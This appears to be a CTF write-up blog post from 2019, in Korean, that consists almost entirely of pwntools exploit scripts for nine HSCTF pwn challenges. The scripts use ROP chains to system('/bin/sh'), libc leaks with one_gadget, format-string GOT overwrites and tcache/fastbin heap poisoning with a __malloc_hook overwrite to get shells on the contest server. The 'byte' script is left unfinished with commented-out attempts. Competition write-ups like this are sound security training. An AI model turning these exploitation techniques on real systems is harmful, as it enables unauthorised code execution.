---
title: Hsctf Writeup
date: 2019-06-08
오랜만에 올리는.. 먼저 풀려있던 문제 2개 제외하고 처음으로 다 풀어서 기념으로..!
사실 문제가 쉬워서 가능했던 ㅠ
---

# combo chain lite

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',3131)
else :
	t = process('./ch-lite')

e = ELF('./ch-lite')
l = e.libc

def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

prdi = 0x0000000000401273
main = 0x00000000004004d0

lr = e.search(asm("leave; ret")).next()
ret = e.search(asm("ret")).next()

r("Here's your free computer: ")
system = int(t.recv(14),16)
pp('system')

r("? Enter the right combo for some COMBO CARNAGE!: ")
s("a"*0x10 + p64(prdi) + p64(e.bss()+0x10) + p64(e.plt['gets']) + p64(prdi) + p64(e.bss()+0x10) + p64(system))
pause(1)
t.sendline("/bin/sh\x00")
t.interactive()
```





# storytime

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',3333)
else :
	t = process('./storytime')

e = ELF('./storytime')
l = e.libc

def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

prdi = 0x0000000000400703
prsi = 0x0000000000400701
main = 0x00000000004004d0

lr = e.search(asm("leave; ret")).next()
ret = e.search(asm("ret")).next()

r("Tell me a story: \n")
s("a"*0x38 + p64(prdi) + p64(1) + p64(prsi) + p64(e.got['read']) + p64(0) + p64(e.plt['write']) + p64(main))

libc = u64(t.recv(6).ljust(8,'\x00')) - l.symbols['read']
pp('libc')
one = libc + 0x4526a

r("Tell me a story: \n")
s("a"*0x38 + p64(one) + p64(0)*20)

t.interactive()
```



# combo chain

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',2345)
else :
	t = process('./combo-chain')

e = ELF('./combo-chain')
l = e.libc

def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

prdi = 0x401263
prsi = 0x0000000000401261
main = 0x401080

lr = e.search(asm("leave; ret")).next()
ret = e.search(asm("ret")).next()

pause()
r("Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: ")

s("a"*0x10 + p64(prdi) + p64(e.bss()+0x10) + p64(e.plt['gets']) + p64(prdi) + p64(e.bss() + 0x10) + p64(e.plt['printf']) + p64(main))
pause(1)
s("%21$p")

libc = int(t.recv(14),16) - 0x3da7db
pp('libc')
one = libc + 0x4526a
s("a"*0x10 + p64(one) + p64(0)*20)

t.interactive()
```





# bit

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',4444)
else :
	t = process('./bit')

e = ELF('./bit')
l = e.libc

def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

flag = 0x080486a6
ch = 0x80484f6

def flip(addr,index):
	t.sendafter("Give me the address of the byte: ",str(addr))
	t.sendlineafter("Give me the index of the bit: ",str(index))

flip("0x804a01c","4")
flip("0x804a01c","6")
flip("0x804a01d","1")
flip("0x804a024","0")

t.interactive()
```





# byte

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',6666)
else :
	t = process('./byte')

e = ELF('./byte')
l = e.libc

def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

flag = 0x0000124d
main = 0x00001323

def flip(addr):
	t.sendlineafter("Give me the address of the byte: ",str(addr))
	#t.sendlineafter("Give me the index of the bit: ",str(index))

pause()

flip("%3$p%7$p")
pie = int(t.recv(10),16) - 0x141a
pp('pie')
exit_got = pie + e.got['exit']
pp('exit_got')
stack = int(t.recv(10),16)
f = stack - 0x134
pp('stack')
#flip(p32(exit_got) + "%" + str(exit_got) + "c%14$n")
#flip(str(exit_got))
#aa = hex(pie + 0xf)
#flip(str(aa))
bss = pie + e.bss()+0x100 + 0x66 - 8
pp('bss')
pp('f')
print hex(f)[3:]
aaa = f - 0x6
#flip(p32(bss))
flip("f" + str(hex(aaa)[3:]))

aaa = f - 0x6


t.interactive()
```





# caesar's revenge

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',4567)
else :
	t = process('./revenge')

e = ELF('./revenge')
l = e.libc

def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

main = 0x4011a1

def go(aa):
	t.sendlineafter("Enter text to be encoded: ",str(aa))
	t.sendlineafter("Enter number of characters to shift: ","26")

r("Welcome to the Caesar Cipher Encoder!\n")

go("%" + str(main) + "c%27$ln".ljust(0x10,"a") + p64(e.got['puts']))
go("%41$p")

r("Result: ")
libc = int(t.recv(14),16) - l.symbols['_IO_2_1_stdout_']
pp('libc')
# 130
one = libc + 0x4526a
a = one & 0xffffffff & 0xffff
b = (one & 0xffffffff) >> 16

pp('one')
pause()
if a > b :
	p = "%" + str(b) + "c%30$hn" + "%" + str(a-b) + "c%31$hn"
	p = p.ljust(0x20,"a")
	p += p64(e.got['printf']+2) + p64(e.got['printf'])
	go(p)
else :
	p = "%" + str(a) + "c%30$hn" + "%" + str(b-a) + "c%31$hn"
	p = p.ljust(0x20,"a")
	p += p64(e.got['printf']) + p64(e.got['printf']+2)
	go(p)

t.interactive()
```





# aria-writer

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',2222)
	e = ELF('./aria-writer')
	l = ELF('./libc-2.27.so')
else :
	t = process('./aria-writer')
	e = ELF('./aria-writer')
	l = e.libc


def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def sla(a):
	t.sendlineafter("> ",str(a))

def add(size,a):
	t.sendafter("> ","1")
	t.sendafter("> ",str(size))
	sla(str(a))

def free():
	t.sendafter("> ","2"+"\x00\x00\x00")

def secret():
	t.sendafter("> ","3"+"\x00\x00\x00")

sla("")
secret()
add(0x20,"dummy")
free()
free()
add(0x30,"dummy")
free()
free()
add(0x40,"dummy")
free()
free()

add(0x20,p64(e.got['free']))
add(0x20,"a")
add(0x20,p64(e.plt['puts']))

add(0x30,p64(0x6020c0))
add(0x30,"a")
add(0x30,p64(e.got['write']))
free()

r("ok that letter was bad anyways...\n")
libc = u64(t.recv(6).ljust(8,'\x00')) - l.symbols['write']
pp('libc')

add(0x40,p64(e.got['write']))
add(0x40,"a")
add(0x40,p64(libc+0x4f322))
secret()

t.interactive()
```



# arie writer v3

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',2468)
	e = ELF('./aria-writer2')
	l = ELF('./libc-2.27.so')
else :
	t = process('./aria-writer2')
	e = ELF('./aria-writer2')
	l = e.libc


def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def sla(a):
	t.sendlineafter("> ",str(a))

def sa(a):
	t.sendafter("> ",str(a))

def add(size,a):
	sla("1")
	sla(str(size))
	sa(str(a))

def free():
	t.sendafter("> ","2"+"\x00\x00\x00")

sla("")
add(0x10,"a")
add(0x10,"a")
add(0x10,"a")
add(0x10,"a")
add(0x10,"a")
free()
free()
add(0x10,p64(0x602040))
add(0x10,"a")
add(0x80,"a")
free()
add(0x28,"a"*0x20 + p64(0x602040))
add(0x80,"a")
for i in range(8):
	free()
add(0x80,"\x30")
add(0x10,"\x10")
add(0x10,"\x30")
add(0x10,p64(0x4008a7))
sla("1")
sla("1")


#add(0x30,"a")
t.interactive()
```





# hard-heap

```python
from pwn import *
import sys

if len(sys.argv) > 1:
	t = remote('pwn.hsctf.com',5555)
else :
	t = process('./hard-heap')

e = ELF('./hard-heap')
l = e.libc

def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def sla(a):
	t.sendlineafter("> ",str(a))

def sa(a):
	t.sendafter("> ",str(a))

def add(size,a):
	sla("1")
	sla(str(size))
	sa(str(a))

def view(index):
	sla("2")
	sla(str(index))

def free(index):
	sla("3")
	sla(str(index))

add(0x28,"a")
add(0x28,"a")
add(0x18,"a")
add(0x18,"a")
add(0x18,"a")
add(0x48,"a")
add(0x48,"a")

free(1)
free(0)
free(1)

view(0)

heap = u64(t.recv(6).ljust(8,'\x00')) - 0x30
pp('heap')

add(0x28,p64(heap+0x20))
add(0x28,p64(heap+0x20) + p64(0)*2 + p64(0x31))
add(0x28,"a")
add(0x28,p64(0) + p64(0x91))
free(1)

view(1)

libc = u64(t.recv(6).ljust(8,'\x00')) - 0x3c4b78
pp('libc')

free(0)
free(5)
free(6)
free(5)

add(0x48,p64(libc+0x3c4b78-0x40-11))
add(0x48,"a")
add(0x48,"a")
add(0x48,"\x00\x00\x00" + p64(0)*7 + p64(libc+l.symbols['__malloc_hook']-0x10))

add(0x48,"a")
add(0x48,p64(libc+0xf1147))

sla("1")
sla("1")

t.interactive()
```

